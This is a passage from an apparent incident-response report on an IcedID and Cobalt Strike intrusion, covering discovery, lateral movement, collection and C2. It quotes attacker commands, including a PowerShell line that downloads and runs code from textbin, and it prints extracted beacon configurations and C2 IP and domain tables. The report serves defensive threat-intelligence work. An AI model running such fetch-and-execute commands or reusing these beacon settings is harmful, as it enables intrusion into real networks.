<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16931" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-046.png" alt width="878" height="228" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-046.png 878w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-046-300x78.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-046-768x199.png 768w" sizes="(max-width: 878px) 100vw, 878px" /></a></p>
<figure class="wp-block-embed">
<div><a href="https://fareedfauzi.gitbook.io/oscp-playbook/windows-post-exploitation/automated-enumeration-script" target="_blank" rel="noopener">Automated enumeration script</a></div>
<div class="wp-block-embed__wrapper"> </div>
</figure>
<h3 class="wp-block-heading">WMIC</h3>
<p>The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration. This can be useful to determine drives, including mounted network shares.</p>
<pre class="wp-block-preformatted">wmic /node:&lt;REDACTED&gt; /user:"&lt;REDACTED&gt;" /password:"&lt;REDACTED&gt;" logicaldisk get caption,description,drivetype,providername,volumename</pre>
<p>The dS.bat file was executed by the injected Rundll32.exe process.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16932" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-047.png" alt width="1124" height="528" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-047.png 1124w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-047-300x141.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-047-1024x481.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-047-768x361.png 768w" sizes="(max-width: 1124px) 100vw, 1124px" /></a></p>
<p>During hands-on discovery by the threat actors, the Group Policy was viewed by the Microsoft Management Console application to view Domain Group Policy Objects.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16933" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-048.png" alt width="448" height="88" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-048.png 448w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-048-300x59.png 300w" sizes="(max-width: 448px) 100vw, 448px" /></a></p>
<p>This can provide useful information concerning any restrictions or configuration settings for hosts on the network.</p>
<h2 class="wp-block-heading" id="lateral-movement"><a href="#lateral-movement">Lateral Movement</a></h2>
<h3 class="wp-block-heading">WMI</h3>
<p>Threat actors used wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers. The payloads were stored on textbin[.]net.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16934" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-049.png" alt width="1600" height="712" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-049.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-049-300x134.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-049-1024x456.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-049-768x342.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-049-1536x684.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>As we can see above, WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16935" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-050.png" alt width="982" height="869" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-050.png 982w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-050-300x265.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-050-768x680.png 768w" sizes="(max-width: 982px) 100vw, 982px" /></a></p>
<h3 class="wp-block-heading">Remote Desktop Protocol</h3>
<p>The beacon C:\ProgramData\lsass.exe was used to proxy RDP connections and connect to another computer.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16936" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-051.png" alt width="633" height="504" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-051.png 633w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-051-300x239.png 300w" sizes="(max-width: 633px) 100vw, 633px" /></a></p>
<p>Proxying RDP traffic via a process such as a Cobalt Strike beacon reduces the exposure of the threat actor&#8217;s own infrastructure, and blends RDP activity to those of internal hosts on the network.</p>
<p>The use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16937" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-052.png" alt width="1807" height="227" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-052.png 1807w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-052-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-052-1024x129.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-052-768x96.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-052-1536x193.png 1536w" sizes="(max-width: 1807px) 100vw, 1807px" /></a></p>
<p>The common processes observed were two injected processes, and the Nigu.exe/lsass.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16938" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-053.png" alt width="882" height="259" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-053.png 882w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-053-300x88.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-053-768x226.png 768w" sizes="(max-width: 882px) 100vw, 882px" /></a></p>
<p>These processes are unusual for establishing RDP connections. During these RDP sessions, the threat actors often opened Internet Explorer to download their beacons or commands they wanted to run on lateral hosts. An example would be pon.txt. This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon:</p>
<pre class="wp-block-preformatted">"C:\Windows\system32\NOTEPAD.EXE" C:\Users\REDACTED\Downloads\pon.txt</pre>
<p>pon.txt contents:</p>
<pre class="wp-block-preformatted">powershell iex((new-object net.webclient).downloadstring('https://textbin.net/raw/ls1jhefawt'))</pre>
<h3 class="wp-block-heading">Remote Service</h3>
<p>Remote services were also created in order to propagate Cobalt Strike beacons in the network.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16939" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-054.png" alt width="1222" height="401" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-054.png 1222w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-054-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-054-1024x336.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-054-768x252.png 768w" sizes="(max-width: 1222px) 100vw, 1222px" /></a></p>
<h3 class="wp-block-heading">AnyDesk</h3>
<p>AnyDesk was used to move laterally between a workstation and a backup server as shown below with Sysmon event 3 (Network connection):</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16940" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-055.png" alt width="1725" height="410" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-055.png 1725w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-055-300x71.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-055-1024x243.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-055-768x183.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-055-1536x365.png 1536w" sizes="(max-width: 1725px) 100vw, 1725px" /></a></p>
<h2 class="wp-block-heading" id="collection">Collection</h2>
<p>To achieve collection of various directories on multiple hosts, the threat actors used the dir command through the administrative share c$ and redirected the output to a file text named listing.txt.</p>
<pre class="wp-block-preformatted">C:\Windows\System32\cmd.exe /C dir \\[REDACTED HOST]\c$\users &gt;&gt; listing.txt</pre>
<p>In addition, multiple text files were also created to store the output of various discovery commands and scripts.</p>
<pre class="wp-block-preformatted">C:\ProgramData\qwe3.txt
C:\Users\[REDACTED USER]\Downloads\sns.txt
C:\Windows\Temp\events_Administrator.text
C:\Windows\Temp\events_[REDACTED USER].text
C:\Windows\Temp\listing.txt
C:\Windows\Temp\ns.txt
C:\Windows\Temp\nsserv.txt</pre>
<h2 class="wp-block-heading" id="command-and-control"><a href="#command-and-control">Command and Control</a></h2>
<h3 class="wp-block-heading">IcedID</h3>
<p>The malware configuration:</p>
<pre class="wp-block-preformatted">Configuration details: 
{“Campaign ID”: 2220668032 ,“C2 url”: “alockajilly.com”}</pre>
<p>Initially the IcedID malware made a connection to 64.227.12[.]180:80 for it&#8217;s first call back. This aligns with the domain present in the malware configuration details.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16941" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-056.png" alt width="719" height="96" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-056.png 719w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-056-300x40.png 300w" sizes="(max-width: 719px) 100vw, 719px" /></a></p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16942" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-057.png" alt width="1960" height="112" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-057.png 1960w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-057-300x17.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-057-1024x59.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-057-768x44.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-057-1536x88.png 1536w" sizes="(max-width: 1960px) 100vw, 1960px" /></a></figure>
<p>After the first call over an unencrypted port, command and control traffic moved over to TLS on port 443. Connections were made to various IP&#8217;s over the length of the intrusion, but two made up the majority of the traffic.</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>destination.ip</td>
<td>destination.port</td>
<td>tls.client.ja3</td>
<td>tls.server.ja3s</td>
<td>zeek.ssl.server.name</td>
<td>Count</td>
</tr>
<tr>
<td>5.196.103.145</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
<td>choifejuce[.]lol</td>
<td>373</td>
</tr>
<tr>
<td>5.196.103.145</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
<td>erinindiaka[.]quest</td>
<td>1</td>
</tr>
<tr>
<td>46.101.19.119</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
<td>opiransiuera[.]com</td>
<td>278</td>
</tr>
<tr>
<td>178.128.85.30</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
<td>zoomersoidfor[.]com</td>
<td>4</td>
</tr>
<tr>
<td>5.252.177.10</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
<td>considerf[.]info</td>
<td>1</td>
</tr>
<tr>
<td>66.63.188.70</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
<td>antiflamez[.]bar</td>
<td>1</td>
</tr>
<tr>
<td>155.138.159.45</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
<td>www[.]onlinecloud[.]cloud</td>
<td>1</td>
</tr>
</tbody>
</table>
</figure>
<p>IcedID C2 beaconing over the intrusion:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16943" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-058.png" alt width="2493" height="416" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-058.png 2493w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-058-300x50.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-058-1024x171.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-058-768x128.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-058-1536x256.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-058-2048x342.png 2048w" sizes="(max-width: 2493px) 100vw, 2493px" /></a></p>
<h3 class="wp-block-heading">Cobalt Strike</h3>
<p>There were a number of beacons deployed across the environment, over 70 pipes were created. The beacons used recognizable default Cobalt Strike configurations and attempted to masquerade dropped files as legitimate Microsoft Windows executables. For example, on one host, we could observe over 20 pipes being created, in a pattern of postex_xxxx or MSSE-xxxx-server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16944" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-059.png" alt width="513" height="310" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-059.png 513w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-059-300x181.png 300w" sizes="(max-width: 513px) 100vw, 513px" /></a></p>
<p>When beacons were deployed within the environment, there was a significant increase in outbound network connections to C2 servers. For example, a beacon injected into a single Rundll32.exe process generated over 10K connections in a three hour window, consistently across two days.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16945" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-060.png" alt width="874" height="217" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-060.png 874w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-060-300x74.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-060-768x191.png 768w" sizes="(max-width: 874px) 100vw, 874px" /></a></p>
<p>The threat actors deployed various beacons over the course of the intrusion using different methods including executables, DLLs, and PowerShell beacons.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-061.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16946" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-061.png" alt width="1085" height="312" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-061.png 1085w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-061-300x86.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-061-1024x294.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-061-768x221.png 768w" sizes="(max-width: 1085px) 100vw, 1085px" /></a></p>
<p>Over the length of the intrusion four different Cobalt Strike servers were observed in use. Some lasted the majority of the intrusion while others only lasted a few days.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16947" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-062.png" alt width="2469" height="401" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-062.png 2469w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-062-300x49.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-062-1024x166.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-062-768x125.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-062-1536x249.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-062-2048x333.png 2048w" sizes="(max-width: 2469px) 100vw, 2469px" /></a></p>
<p>Cobalt Strike SSL characteristics:</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>destination.ip</td>
<td>destination.port</td>
<td>tls.client.ja3</td>
<td>tls.client.ja3s</td>
<td>zeek.ssl.server.name</td>
</tr>
<tr>
<td>172.93.181.165</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ae4edc6faf64d08308082ad26be60767</td>
<td>fazehotafa[.]com</td>
</tr>
<tr>
<td>45.66.151.109</td>
<td>443</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ae4edc6faf64d08308082ad26be60767</td>
<td>guteyutur[.]com</td>
</tr>
<tr>
<td>111.90.143.191</td>
<td>443</td>
<td>72a589da586844d7f0818ce684948eea</td>
<td>ae4edc6faf64d08308082ad26be60767</td>
<td>&#8211;</td>
</tr>
<tr>
<td>78.128.112.139</td>
<td>443</td>
<td>72a589da586844d7f0818ce684948eea</td>
<td>f176ba63b4d68e576b5ba345bec2c7b7</td>
<td>&#8211;</td>
</tr>
</tbody>
</table>
</figure>
<p>Analysis of the Nigu.exe binary indicated use of compression and PE loading characteristics, typically observed for Cobalt Strike payload beacon. Using CAPA, the results listed the following capabilities:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16948" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-063.png" alt width="885" height="294" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-063.png 885w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-063-300x100.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-063-768x255.png 768w" sizes="(max-width: 885px) 100vw, 885px" /></a></p>
<p>Embedded within the binary were strings such as: &#8220;inflate 1.2.11 Copyright 1995-2017 Mark Adler&#8221;. Once the file was unpacked and the Cobalt Strike beacon binary carved, the Cobalt Strike configuration could be determined as follows:</p>
<pre class="wp-block-preformatted">{
  "beacontype": [
    "HTTPS"
  ],
  "sleeptime": 5000,
  "jitter": 28,
  "maxgetsize": 1865903,
  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
  "license_id": 0,
  "cfg_caution": false,
  "kill_date": null,
  "server": {
    "hostname": "fazehotafa.com",
    "port": 443,
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC1nAS8+PqMnQs3hynG2JDgMQK6ZqLkIoDXWnqaOS/dQsdKBHE0Ify/HIZ2ntSpyMtvomDHCA98pCEi1L7mT0mvfiYapP9Aj776rDpzXMYNiRk1BWrAzJqzLcfwzxJx26hL1VSu1C5mWEl7JsVT/9l/kHcNYAALgNQuI0uZAqM7YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
  },
  "host_header": "",
  "useragent_header": null,
  "http-get": {
    "uri": "/ak.css",
    "verb": "GET",
    "client": {
      "headers": null,
      "metadata": null
    },
    "server": {
      "output": [
        "print",
        "prepend 1767 characters",
        "base64",
        "base64url"
      ]
    }
  },
  "http-post": {
    "uri": "/profile",
    "verb": "POST",
    "client": {
      "headers": null,
      "id": null,
      "output": null
    }
  },
  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "crypto_scheme": 0,
  "proxy": {
    "type": null,
    "username": null,
    "password": null,
    "behavior": "Use IE settings"
  },
  "http_post_chunk": 0,
  "uses_cookies": true,
  "post-ex": {
    "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
    "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
  },
  "process-inject": {
    "allocator": "VirtualAllocEx",
    "execute": [
      "CreateThread",
      "CreateRemoteThread",
      "RtlCreateUserThread"
    ],
    "min_alloc": 9369,
    "startrwx": false,
    "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==",
    "transform-x86": [
      "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'"
    ],
    "transform-x64": [
      "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'"
    ],
    "userwx": false
  },
  "dns-beacon": {
    "dns_idle": null,
    "dns_sleep": null,
    "maxdns": null,
    "beacon": null,
    "get_A": null,
    "get_AAAA": null,
    "get_TXT": null,
    "put_metadata": null,
    "put_output": null
  },
  "pipename": null,
  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "stage": {
    "cleanup": true
  },
  "ssh": {
    "hostname": null,
    "port": null,
    "username": null,
    "password": null,
    "privatekey": null
  }
}</pre>
<p>Configurations for other Cobalt Strike servers observed:</p>
<pre class="wp-block-preformatted">{
    "beacontype": [
        "HTTPS"
    ],
    "sleeptime": 60000,
    "jitter": 0,
    "maxgetsize": 1048576,
    "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
    "license_id": 0,
    "cfg_caution": false,
    "kill_date": null,
    "server": {
        "hostname": "111.90.143.191",
        "port": 443,
        "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    },
    "host_header": "",
    "useragent_header": null,
    "http-get": {
        "uri": "/j.ad",
        "verb": "GET",
        "client": {
            "headers": null,
            "metadata": null
        },
        "server": {
            "output": [
                "print"
            ]
        }
    },
    "http-post": {
        "uri": "/submit.php",
        "verb": "POST",
        "client": {
            "headers": null,
            "id": null,
            "output": null
        }
    },
    "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "crypto_scheme": 0,
    "proxy": {
        "type": null,
        "username": null,
        "password": null,
        "behavior": "Use IE settings"
    },
    "http_post_chunk": 0,
    "uses_cookies": true,
    "post-ex": {
        "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
        "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
    },
    "process-inject": {
        "allocator": "VirtualAllocEx",
        "execute": [
            "CreateThread",
            "SetThreadContext",
            "CreateRemoteThread",
            "RtlCreateUserThread"
        ],
        "min_alloc": 0,
        "startrwx": true,
        "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==",
        "transform-x86": null,
        "transform-x64": null,
        "userwx": true
    },
    "dns-beacon": {
        "dns_idle": null,
        "dns_sleep": null,
        "maxdns": null,
        "beacon": null,
        "get_A": null,
        "get_AAAA": null,
        "get_TXT": null,
        "put_metadata": null,
        "put_output": null
    },
    "pipename": null,
    "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "stage": {
        "cleanup": false
    },
    "ssh": {
        "hostname": null,
        "port": null,
        "username": null,
        "password": null,
        "privatekey": null
    }
}</pre>
<pre class="wp-block-preformatted">{
    "beacontype": [
        "HTTPS"
    ],
    "sleeptime": 60000,
    "jitter": 0,
    "maxgetsize": 1048576,
    "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
    "license_id": 305419776,
    "cfg_caution": false,
    "kill_date": null,
    "server": {
        "hostname": "78.128.112.139",
        "port": 443,
        "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    },
    "host_header": "",
    "useragent_header": null,
    "http-get": {
        "uri": "/ga.js",
        "verb": "GET",
        "client": {
            "headers": null,
            "metadata": null
        },
        "server": {
            "output": [
                "print"
            ]
        }
    },
    "http-post": {
        "uri": "/submit.php",
        "verb": "POST",
        "client": {
            "headers": null,
            "id": null,
            "output": null
        }
    },
    "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "crypto_scheme": 0,
    "proxy": {
        "type": null,
        "username": null,
        "password": null,
        "behavior": "Use IE settings"
    },
    "http_post_chunk": 0,
    "uses_cookies": true,
    "post-ex": {
        "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
        "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
    },
    "process-inject": {
        "allocator": "VirtualAllocEx",
        "execute": [
            "CreateThread",
            "SetThreadContext",
            "CreateRemoteThread",
            "RtlCreateUserThread"
        ],
        "min_alloc": 0,
        "startrwx": true,
        "stub": "tUr+Aexqde3zXhpE+L05KQ==",
        "transform-x86": null,
        "transform-x64": null,
        "userwx": true
    },
    "dns-beacon": {
        "dns_idle": null,
        "dns_sleep": null,
        "maxdns": null,
        "beacon": null,
        "get_A": null,
        "get_AAAA": null,
        "get_TXT": null,
        "put_metadata": null,
        "put_output": null
    },
    "pipename": null,
    "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "stage": {
        "cleanup": false
    },
    "ssh": {
        "hostname": null,
        "port": null,
        "username": null,
        "password": null,
        "privatekey": null
    }
}</pre>
<h3 class="wp-block-heading">Remote Access Software</h3>
<p>As shown above, three different Remote Access Software were used by the threat actor:</p>
<ul class="wp-block-list">
<li>Atera</li>
<li>Splashtop</li>
<li>AnyDesk</li>
</ul>
<p>It is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16949" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-064.png" alt width="907" height="532" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-064.png 907w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-064-300x176.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-064-768x450.png 768w" sizes="(max-width: 907px) 100vw, 907px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-065.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16950" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-065.png" alt width="1232" height="540" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-065.png 1232w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-065-300x131.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-065-1024x449.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-065-768x337.png 768w" sizes="(max-width: 1232px) 100vw, 1232px" /></a></p>
